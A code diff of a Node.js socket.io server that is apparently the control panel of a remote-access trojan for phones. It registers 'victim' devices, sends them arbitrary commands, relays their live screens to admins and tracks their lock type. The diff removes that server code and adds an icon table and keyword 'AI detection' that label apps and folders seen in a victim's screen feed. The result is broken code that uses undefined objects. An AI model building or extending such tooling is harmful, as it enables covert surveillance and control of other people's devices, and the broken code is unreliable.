@@ -1,247 +1,268 @@
-const express = require('express');
-const http = require('http');
-const path = require('path');
-const { Server } = require('socket.io');
-
-const app = express();
-const server = http.createServer(app);
-const io = new Server(server, {
-    pingInterval: 25000,  // बढ़ाया
-    pingTimeout: 10000,   // बढ़ाया
-    transports: ['websocket'],
-    cors: { origin: "*" },
-    allowEIO3: true,
-    connectionStateRecovery: {
-        maxDisconnectionDuration: 2 * 60 * 1000, // 2 minutes
-        skipMiddlewares: true
-    }
-});
-
-const PORT = process.env.PORT || 8080;
-
-let devices = {};
-const adminSockets = new Map();  // Map में बदला
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'panel.html'));
-});
-
-// Connection quality मॉनिटरिंग
-const connectionStats = new Map();
-
-io.on('connection', (socket) => {
-    console.log('✅ New connection:', socket.id);
+// Add this section after your imports
+const iconDatabase = {
+    // App Icons
+    whatsapp: { 
+        color: '#25D366', 
+        text: 'WA', 
+        emoji: '💬',
+        icon: 'https://img.icons8.com/color/96/000000/whatsapp--v1.png'
+    },
+    facebook: { 
+        color: '#1877F2', 
+        text: 'FB', 
+        emoji: '👥',
+        icon: 'https://img.icons8.com/color/96/000000/facebook-new.png'
+    },
+    instagram: { 
+        color: 'linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)', 
+        text: 'IG', 
+        emoji: '📸',
+        icon: 'https://img.icons8.com/color/96/000000/instagram-new--v1.png'
+    },
+    youtube: { 
+        color: '#FF0000', 
+        text: 'YT', 
+        emoji: '🎬',
+        icon: 'https://img.icons8.com/color/96/000000/youtube-play.png'
+    },
+    chrome: { 
+        color: '#4285F4', 
+        text: 'GC', 
+        emoji: '🌐',
+        icon: 'https://img.icons8.com/color/96/000000/google-chrome--v1.png'
+    },
+    gmail: { 
+        color: '#EA4335', 
+        text: 'GM', 
+        emoji: '📧',
+        icon: 'https://img.icons8.com/color/96/000000/gmail--v1.png'
+    },
+    file_manager: { 
+        color: '#009688', 
+        text: 'FM', 
+        emoji: '📁',
+        icon: 'https://img.icons8.com/color/96/000000/folder-invoices--v1.png'
+    },
+    gallery: { 
+        color: '#795548', 
+        text: 'GL', 
+        emoji: '🖼️',
+        icon: 'https://img.icons8.com/color/96/000000/gallery.png'
+    },
+    camera: { 
+        color: '#795548', 
+        text: 'CM', 
+        emoji: '📷',
+        icon: 'https://img.icons8.com/color/96/000000/camera--v1.png'
+    },
+    settings: { 
+        color: '#607D8B', 
+        text: 'ST', 
+        emoji: '⚙️',
+        icon: 'https://img.icons8.com/color/96/000000/settings--v1.png'
+    },
+    phone: { 
+        color: '#4CAF50', 
+        text: 'PH', 
+        emoji: '📞',
+        icon: 'https://img.icons8.com/color/96/000000/phone--v1.png'
+    },
+    messages: { 
+        color: '#03A9F4', 
+        text: 'MSG', 
+        emoji: '💬',
+        icon: 'https://img.icons8.com/color/96/000000/sms.png'
+    },
+    calculator: { 
+        color: '#FF9800', 
+        text: 'CAL', 
+        emoji: '📱',
+        icon: 'https://img.icons8.com/color/96/000000/calculator--v1.png'
+    },
+    clock: { 
+        color: '#9C27B0', 
+        text: 'CLK', 
+        emoji: '⏰',
+        icon: 'https://img.icons8.com/color/96/000000/clock--v1.png'
+    },
+    calendar: { 
+        color: '#E91E63', 
+        text: 'CAL', 
+        emoji: '📅',
+        icon: 'https://img.icons8.com/color/96/000000/calendar--v1.png'
+    },
     
-    // Connection quality ट्रैक करें
-    connectionStats.set(socket.id, {
-        connectedAt: Date.now(),
-        packetsReceived: 0,
-        packetsSent: 0,
-        disconnections: 0
-    });
+    // Folder Icons
+    folder_download: { 
+        color: '#FFC107', 
+        text: 'DL', 
+        emoji: '📥',
+        icon: 'https://img.icons8.com/color/96/000000/downloads-folder.png'
+    },
+    folder_document: { 
+        color: '#9E9E9E', 
+        text: 'DOC', 
+        emoji: '📄',
+        icon: 'https://img.icons8.com/color/96/000000/documents.png'
+    },
+    folder_image: { 
+        color: '#2196F3', 
+        text: 'IMG', 
+        emoji: '🖼️',
+        icon: 'https://img.icons8.com/color/96/000000/pictures-folder.png'
+    },
+    folder_video: { 
+        color: '#4CAF50', 
+        text: 'VID', 
+        emoji: '🎬',
+        icon: 'https://img.icons8.com/color/96/000000/video-folder.png'
+    },
+    folder_music: { 
+        color: '#9C27B0', 
+        text: 'MUS', 
+        emoji: '🎵',
+        icon: 'https://img.icons8.com/color/96/000000/music-folder.png'
+    },
+    
+    // UI Elements
+    ui_button: { 
+        color: '#4285F4', 
+        text: 'BTN', 
+        emoji: '🔘'
+    },
+    ui_back: { 
+        color: 'transparent', 
+        text: '←', 
+        emoji: '←'
+    },
+    ui_home: { 
+        color: 'transparent', 
+        text: '⌂', 
+        emoji: '⌂'
+    },
+    ui_menu: { 
+        color: 'transparent', 
+        text: '☰', 
+        emoji: '☰'
+    },
+    ui_search: { 
+        color: '#F5F5F5', 
+        text: '🔍', 
+        emoji: '🔍'
+    },
+    ui_share: { 
+        color: '#FFC107', 
+        text: '📤', 
+        emoji: '📤'
+    },
+    ui_delete: { 
+        color: '#F44336', 
+        text: '🗑️', 
+        emoji: '🗑️'
+    },
+    ui_edit: { 
+        color: '#2196F3', 
+        text: '✏️', 
+        emoji: '✏️'
+    },
+    ui_save: { 
+        color: '#4CAF50', 
+        text: '💾', 
+        emoji: '💾'
+    },
+    ui_send: { 
+        color: '#9C27B0', 
+        text: '📨', 
+        emoji: '📨'
+    },
+    ui_add: { 
+        color: '#009688', 
+        text: '➕', 
+        emoji: '➕'
+    }
+};
 
-    socket.on('admin_join', () => {
-        adminSockets.set(socket.id, {
-            type: 'admin',
-            connectedAt: Date.now(),
-            lastPing: Date.now()
-        });
-        console.log('👑 Admin joined:', socket.id);
-        socket.emit('device_list', Object.values(devices));
-        
-        // Auto ping
-        const pingInterval = setInterval(() => {
-            if (socket.connected) {
-                socket.emit('ping', { time: Date.now() });
-            }
-        }, 15000);
-        
-        socket.on('pong', (data) => {
-            const admin = adminSockets.get(socket.id);
-            if (admin) {
-                admin.lastPing = Date.now();
-                admin.latency = Date.now() - data.time;
-            }
-        });
-        
-        socket.on('disconnect', () => {
-            clearInterval(pingInterval);
-        });
-    });
+// AI Detection Function
+function detectElementAI(text, className, properties) {
+    if (!text) text = '';
+    const lowerText = text.toLowerCase();
+    
+    // App detection
+    if (lowerText.includes('whatsapp')) return 'whatsapp';
+    if (lowerText.includes('facebook') || lowerText.includes('fb')) return 'facebook';
+    if (lowerText.includes('instagram') || lowerText.includes('insta')) return 'instagram';
+    if (lowerText.includes('youtube') || lowerText.includes('yt')) return 'youtube';
+    if (lowerText.includes('chrome') || lowerText.includes('browser')) return 'chrome';
+    if (lowerText.includes('gmail') || lowerText.includes('mail') || lowerText.includes('email')) return 'gmail';
+    if (lowerText.includes('file') || lowerText.includes('files')) return 'file_manager';
+    if (lowerText.includes('gallery') || lowerText.includes('photos')) return 'gallery';
+    if (lowerText.includes('camera')) return 'camera';
+    if (lowerText.includes('settings') || lowerText.includes('setting')) return 'settings';
+    if (lowerText.includes('phone') || lowerText.includes('dialer') || lowerText.includes('call')) return 'phone';
+    if (lowerText.includes('messages') || lowerText.includes('sms')) return 'messages';
+    if (lowerText.includes('calculator') || lowerText.includes('calc')) return 'calculator';
+    if (lowerText.includes('clock') || lowerText.includes('alarm')) return 'clock';
+    if (lowerText.includes('calendar')) return 'calendar';
+    
+    // Folder detection
+    if (lowerText.includes('download')) return 'folder_download';
+    if (lowerText.includes('document') || lowerText.includes('doc')) return 'folder_document';
+    if (lowerText.includes('picture') || lowerText.includes('image') || lowerText.includes('photo') || lowerText.includes('dcim')) return 'folder_image';
+    if (lowerText.includes('video') || lowerText.includes('movie')) return 'folder_video';
+    if (lowerText.includes('music') || lowerText.includes('audio') || lowerText.includes('song')) return 'folder_music';
+    
+    // UI Elements
+    if (lowerText.includes('back') || text === '←') return 'ui_back';
+    if (lowerText.includes('home') || text === '⌂') return 'ui_home';
+    if (lowerText.includes('menu') || text === '☰') return 'ui_menu';
+    if (lowerText.includes('search') || text === '🔍') return 'ui_search';
+    if (lowerText.includes('share') || text === '📤') return 'ui_share';
+    if (lowerText.includes('delete') || text === '🗑️') return 'ui_delete';
+    if (lowerText.includes('edit') || text === '✏️') return 'ui_edit';
+    if (lowerText.includes('save') || text === '💾') return 'ui_save';
+    if (lowerText.includes('send') || text === '📨') return 'ui_send';
+    if (lowerText.includes('add') || text === '➕' || lowerText.includes('new')) return 'ui_add';
+    
+    // By properties
+    if (properties.clickable && properties.checkable) {
+        return properties.checked ? 'checkbox_checked' : 'checkbox';
+    }
+    if (properties.clickable) return 'ui_button';
+    if (properties.editable) return 'input';
+    
+    return 'text';
+}
 
-    // डिवाइस से कमांड भेजने के लिए
-    socket.on('command_to_device', (data) => {
-        const device = devices[data.deviceId];
-        if (device && device.socketId) {
-            io.to(device.socketId).emit(data.action, data.payload);
+// Socket event handler में add करें
+socket.on('live_screen', (data) => {
+    // AI Processing
+    if (data.detectedElements) {
+        data.detectedElements = data.detectedElements.map(element => {
+            const detectedType = detectElementAI(
+                element.text || element.desc || '',
+                element.class || '',
+                {
+                    clickable: element.clickable || false,
+                    editable: element.editable || false,
+                    checkable: element.checkable || false,
+                    checked: element.checked || false
+                }
+            );
             
-            // Stats update
-            const stats = connectionStats.get(socket.id);
-            if (stats) stats.packetsSent++;
-        }
-    });
-
-    // जब नया डिवाइस कनेक्ट हो
-    socket.on('victim_connect', (deviceInfo) => {
-        const existingDevice = devices[deviceInfo.deviceId];
-        
-        if (existingDevice) {
-            // पहले से है तो सिर्फ socketId अपडेट करें
-            existingDevice.socketId = socket.id;
-            existingDevice.lastConnected = Date.now();
-            existingDevice.disconnections = (existingDevice.disconnections || 0);
-            devices[deviceInfo.deviceId] = existingDevice;
-        } else {
-            // नया डिवाइस
-            devices[deviceInfo.deviceId] = {
-                ...deviceInfo,
-                socketId: socket.id,
-                connectedAt: Date.now(),
-                lastConnected: Date.now(),
-                disconnections: 0
+            element.detectedType = detectedType;
+            element.iconInfo = iconDatabase[detectedType] || { 
+                color: '#E0E0E0', 
+                text: element.text ? element.text.substring(0, 2) : '??', 
+                emoji: '❓'
             };
-        }
-        
-        console.log('📱 Device connected:', deviceInfo.deviceName, 'Socket:', socket.id);
-        
-        // Force connection stability
-        socket.conn.on("packetCreate", (packet) => {
-            if (packet.type === "ping") {
-                const stats = connectionStats.get(socket.id);
-                if (stats) stats.packetsSent++;
-            }
-        });
-        
-        // सभी एडमिन को नोटिफाई करें
-        adminSockets.forEach((admin, adminId) => {
-            if (io.sockets.sockets.get(adminId)?.connected) {
-                io.to(adminId).emit('new_device_joined', devices[deviceInfo.deviceId]);
-            }
-        });
-    });
-
-    // डिवाइस से डेटा प्राप्त करें
-    socket.on('screen_data', (data) => {
-        adminSockets.forEach((admin, adminId) => {
-            if (io.sockets.sockets.get(adminId)?.connected) {
-                io.to(adminId).emit('screen_update', data);
-            }
-        });
-    });
-    
-    socket.on('live_screen', (data) => {
-        // Rate limiting - एक ही डिवाइस से बहुत ज्यादा डेटा न आने दें
-        const device = devices[data.deviceId];
-        if (device) {
-            const now = Date.now();
-            if (device.lastScreenData && (now - device.lastScreenData < 50)) {
-                return; // 20 FPS से ज्यादा नहीं
-            }
-            device.lastScreenData = now;
-        }
-        
-        adminSockets.forEach((admin, adminId) => {
-            if (io.sockets.sockets.get(adminId)?.connected) {
-                io.to(adminId).emit('live_screen', data);
-            }
-        });
-    });
-
-    // हार्टबीट
-    socket.on('heartbeat', (data) => {
-        if (data && data.deviceId && devices[data.deviceId]) {
-            devices[data.deviceId].battery = data.battery;
-            devices[data.deviceId].lockType = data.lockType || "none";
-            devices[data.deviceId].lastSeen = Date.now();
-            devices[data.deviceId].lastHeartbeat = Date.now();
             
-            // सिर्फ active एडमिन को भेजें
-            adminSockets.forEach((admin, adminId) => {
-                const adminSocket = io.sockets.sockets.get(adminId);
-                if (adminSocket?.connected) {
-                    adminSocket.emit('device_heartbeat', {
-                        ...data,
-                        connectionQuality: connectionStats.get(socket.id) || {}
-                    });
-                }
-            });
-        }
-    });
-
-    // Connection health check
-    socket.on('connection_health', (data) => {
-        const stats = connectionStats.get(socket.id);
-        if (stats) {
-            stats.lastHealthCheck = Date.now();
-            stats.healthData = data;
-        }
-    });
-
-    // जब कोई डिस्कनेक्ट हो
-    socket.on('disconnect', (reason) => {
-        console.log('❌ Disconnected:', socket.id, 'Reason:', reason);
-        
-        const stats = connectionStats.get(socket.id);
-        if (stats) {
-            stats.disconnections++;
-            stats.disconnectedAt = Date.now();
-        }
-        
-        // एडमिन है तो
-        if (adminSockets.has(socket.id)) {
-            adminSockets.delete(socket.id);
-            console.log('👑 Admin disconnected:', socket.id);
-        } 
-        // डिवाइस है तो
-        else {
-            let disconnectedDeviceId = null;
-            for (const deviceId in devices) {
-                if (devices[deviceId].socketId === socket.id) {
-                    disconnectedDeviceId = deviceId;
-                    devices[deviceId].lastDisconnected = Date.now();
-                    devices[deviceId].disconnections = (devices[deviceId].disconnections || 0) + 1;
-                    devices[deviceId].socketId = null; // सिर्फ socketId null करें, डिवाइस को डिलीट न करें
-                    break;
-                }
-            }
-            
-            if (disconnectedDeviceId) {
-                console.log('📱 Device socket disconnected:', disconnectedDeviceId);
-                
-                // एडमिन को बताएं कि डिवाइस ऑफलाइन है
-                adminSockets.forEach((admin, adminId) => {
-                    const adminSocket = io.sockets.sockets.get(adminId);
-                    if (adminSocket?.connected) {
-                        adminSocket.emit('device_offline', {
-                            deviceId: disconnectedDeviceId,
-                            lastSeen: Date.now()
-                        });
-                    }
-                });
-            }
-        }
-        
-        // Cleanup after delay
-        setTimeout(() => {
-            connectionStats.delete(socket.id);
-        }, 60000);
-    });
-});
-
-// Periodic cleanup
-setInterval(() => {
-    const now = Date.now();
-    for (const deviceId in devices) {
-        const device = devices[deviceId];
-        // अगर डिवाइस 5 मिनट से ज्यादा से ऑफलाइन है तो हटा दें
-        if (device.lastSeen && (now - device.lastSeen > 5 * 60 * 1000)) {
-            console.log('🧹 Cleaning up old device:', deviceId);
-            delete devices[deviceId];
-        }
+            return element;
+        });
     }
-}, 60000);
-
-server.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📊 Max listeners: ${server.maxListeners}`);
+    
+    adminSockets.forEach((admin, adminId) => {
+        if (io.sockets.sockets.get(adminId)?.connected) {
+            io.to(adminId).emit('live_screen', data);
+        }
+    });
 });
